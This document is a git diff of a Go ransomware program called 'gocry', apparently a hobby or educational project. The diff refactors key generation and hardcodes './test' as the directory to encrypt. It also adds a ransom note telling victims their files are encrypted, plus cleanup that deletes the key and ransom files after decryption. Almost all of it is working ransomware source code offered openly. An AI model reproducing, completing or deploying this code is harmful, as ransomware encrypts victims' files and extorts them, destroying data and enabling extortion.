@@ -20,18 +20,19 @@ import (
 	"strings"
 	"time"
 
-	"github.com/joho/godotenv"
 	"github.com/nireo/gocry/utils"
 	uuid "github.com/satori/go.uuid"
 	"golang.org/x/exp/errors/fmt"
 )
+
+var rootToEncrypt string = "./test"
 
 const message string = `
 Hello, you've been infected by gocry. Your files have been encrypted using military grade encryption >:D.
 Do not use any decryption software or change the files, otherwise they might be lost forever.
 
 How to decrypt:
-Run the decrypt_files providing the key file with the right key!
+Place the correct key.txt into the decrypted root folder.
 `
 
 // Ransomware holds all the values and functions needed to operate the ransomware.
@@ -49,14 +50,13 @@ type victimIndentifier struct {
 }
 
 // GenNewKey creates a random 32-bit key using the std crypto library.
-func (rw *Ransomware) GenNewKey() error {
+func GenNewKey() ([]byte, error) {
 	key, err := utils.Gen32BitKey()
 	if err != nil {
-		log.Fatal(err)
+		return nil, err
 	}
 
-	rw.key = key
-	return nil
+	return key, nil
 }
 
 // checkIfEncrypted doesn't do any complex checking just checks if some of the files
@@ -196,19 +196,20 @@ func (rw *Ransomware) checkIfActiveRansom() error {
 	return nil
 }
 
-func main() {
-	if err := godotenv.Load(); err != nil {
-		log.Fatal(err)
+func newRansomware() *Ransomware {
+	key, err := GenNewKey()
+	if err != nil {
+		log.Fatalf("error creating random 32-bit key: %s", err)
 	}
 
-	ransomware := &Ransomware{}
-	ransomware.GenNewKey()
-	ransomware.rootDir = os.Getenv("root_dir")
+	return &Ransomware{
+		rootDir: rootToEncrypt,
+		key:     key,
+	}
+}
 
-	// Check if the user already has a ransom
-	// if err := ransomware.checkIfActiveRansom(); err != nil {
-	// 	log.Fatal(err)
-	// }
+func main() {
+	ransomware := newRansomware()
 
 	// Create the message file
 	file, err := os.Create(ransomware.rootDir + "/ransom.txt")
@@ -298,6 +299,15 @@ func main() {
 				// The ransom has been paid so decrypt the files..
 				ransomware.decryptDirectory(ransomware.rootDir)
 				fmt.Println("Thank you for your cooperation!")
+
+				// remove the key and the ransom files.
+				if err := os.Remove(ransomware.rootDir + "/key.txt"); err != nil {
+					log.Fatalf("error removing key file: %s", err)
+				}
+
+				if err := os.Remove(ransomware.rootDir + "/ransom.txt"); err != nil {
+					log.Fatalf("error removing ransom file: %s", err)
+				}
 				break
 			}
 			fmt.Println("Key did not match, checking again in 3 minutes...")
